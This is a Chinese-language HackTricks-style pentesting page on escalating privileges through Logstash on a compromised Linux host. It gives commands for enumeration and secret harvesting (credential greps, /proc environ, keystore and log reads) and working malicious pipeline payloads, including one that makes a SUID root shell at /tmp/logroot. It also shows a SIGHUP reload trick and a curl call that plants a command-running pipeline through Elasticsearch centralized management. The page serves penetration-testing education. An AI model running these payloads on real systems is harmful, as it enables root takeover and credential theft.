# Logstash 权限提升

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash 用于通过称为 **pipelines** 的系统**收集、转换和分发日志**。这些 pipelines 由 **input**、**filter** 和 **output** 阶段组成。当 Logstash 在已被攻陷的机器上运行时，会出现一个值得关注的情况。

### Pipeline 配置

Pipeline 配置位于 **/etc/logstash/pipelines.yml** 文件中，该文件列出了各个 pipeline 配置的位置：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
该文件揭示了包含 pipeline 配置的 **.conf** 文件所在位置。在使用 **Elasticsearch output module** 时，**pipelines** 中通常会包含 **Elasticsearch credentials**；由于 Logstash 需要向 Elasticsearch 写入数据，这些凭据往往拥有较高权限。配置路径中的通配符允许 Logstash 执行指定目录中所有匹配的 pipeline。

如果 Logstash 使用 `-f <directory>` 启动，而不是使用 `pipelines.yml`，则该目录中的**所有文件**会按字典序拼接，并作为单个配置进行解析。这会带来两种攻击层面的影响：

- 放置一个类似 `000-input.conf` 或 `zzz-output.conf` 的文件，可以改变最终 pipeline 的组装方式
- 格式错误的文件可能导致整个 pipeline 无法加载，因此在依赖 auto-reload 之前，请仔细验证 payload

### 在已攻陷主机上快速枚举

在安装了 Logstash 的主机上，可以快速检查：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
另外，检查本地监控 API 是否可访问。默认情况下，它绑定在 **127.0.0.1:9600**，在获得主机访问权限后通常就足够了：
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
这通常会提供 pipeline IDs、运行时详细信息，并确认你修改后的 pipeline 已加载。

从 Logstash 中恢复的 Credentials 通常可以解锁 **Elasticsearch**，因此请查看[这个关于 Elasticsearch 的页面](../../network-services-pentesting/9200-pentesting-elasticsearch.md)。

### Privilege Escalation via Writable Pipelines

要尝试 Privilege Escalation，首先确定 Logstash 服务运行所使用的用户，通常是 **logstash** 用户。确保满足以下**一项**条件：

- 对 pipeline **.conf** 文件拥有**写入权限**，或者
- **/etc/logstash/pipelines.yml** 文件使用了 wildcard，并且你可以写入目标文件夹

此外，还必须满足以下**一项**条件：

- 能够重启 Logstash 服务，或者
- **/etc/logstash/logstash.yml** 文件已设置 `config.reload.automatic: true`

如果配置中存在 wildcard，创建一个匹配该 wildcard 的文件即可执行命令。例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
此处，**interval** 决定以秒为单位的执行频率。在给定示例中，**whoami** 命令每 120 秒运行一次，并将其输出写入 **/tmp/output.log**。

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true** 后，Logstash 会自动检测并应用新的或已修改的 pipeline 配置，无需重启。如果没有使用 wildcard，仍然可以修改现有配置，但应谨慎操作，以避免造成中断。

### 更可靠的 Pipeline Payload

`exec` input plugin 在当前版本中仍然有效，并且需要设置 `interval` 或 `schedule`。它通过 **forking** Logstash JVM 来执行，因此如果内存紧张，你的 payload 可能会因 **ENOMEM** 而失败，而不是静默运行。

更实用的 privilege-escalation payload 通常是能够留下持久 artifact 的 payload：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
如果你没有重启权限，但可以向进程发送信号，Logstash 也支持在类 Unix 系统上通过 **SIGHUP** 触发重新加载：
```bash
kill -SIGHUP $(pgrep -f logstash)
```
请注意，并非每个 plugin 都支持 reload。例如，**stdin** input 会阻止 automatic reload，因此不要认为 `config.reload.automatic` 总能检测到你的更改。

### 从 Logstash 窃取 Secrets

在只关注 code execution 之前，先收集 Logstash 已经能够访问的数据：

- 明文 credentials 通常硬编码在 `elasticsearch {}` outputs、`http_poller`、JDBC inputs 或与 cloud 相关的设置中
- Secure settings 可能位于 **`/etc/logstash/logstash.keystore`** 或其他 `path.settings` 目录中
- keystore password 通常通过 **`LOGSTASH_KEYSTORE_PASS`** 提供；基于 package 的安装通常会从 **`/etc/sysconfig/logstash`** 中加载它
- 使用 `${VAR}` 的 environment-variable expansion 会在 Logstash 启动时解析，因此值得检查 service environment

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
这同样值得检查，因为 **CVE-2023-46672** 表明，在特定情况下，Logstash 可能会将敏感信息记录到日志中。因此，在 post-exploitation 主机上，即使当前配置引用的是 keystore，而不是将 secrets 直接存储在配置中，旧的 Logstash 日志和 `journald` 条目仍可能泄露凭据。

### Centralized Pipeline Management Abuse

在某些环境中，主机**完全不依赖本地 `.conf` 文件**。如果配置了 **`xpack.management.enabled: true`**，Logstash 可以从 Elasticsearch/Kibana 拉取集中管理的 pipelines；启用此模式后，本地 pipeline 配置不再是事实来源。

这意味着存在另一条攻击路径：

1. 从本地 Logstash 设置、keystore 或日志中恢复 Elastic 凭据
2. 验证该账户是否具有 **`manage_logstash_pipelines`** cluster privilege
3. 创建或替换一个集中管理的 pipeline，使 Logstash 主机在下一次 poll interval 执行你的 payload

此功能使用的 Elasticsearch API 是：
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
当本地文件为只读状态，但 Logstash 已注册为从远程获取 pipelines 时，这尤其有用。

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
